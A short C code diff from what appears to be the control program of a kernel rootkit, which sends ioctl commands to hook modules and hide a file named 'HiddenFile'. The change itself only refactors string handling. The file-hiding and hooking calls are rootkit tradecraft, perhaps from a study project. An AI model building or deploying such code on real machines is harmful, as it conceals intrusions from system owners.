@@ -53,10 +53,11 @@ int main(int argc, char *argv[]) {
         ioctl(fd, IOCTL_MOD_HOOK);
     } else if (strcmp(argv[1], "3") == 0) {
         // hide "HiddenFile"
+        const char *target = "HiddenFile";
         struct hided_file file = {
-            11,
-            "HiddenFile"
+            strlen(target) + 1,
         };
+        strncpy(file.name, target, NAME_LEN - 1);
         ioctl(fd, IOCTL_FILE_HIDE, &file);
     } else {
         fprintf(stderr, "Invalid command.\n");
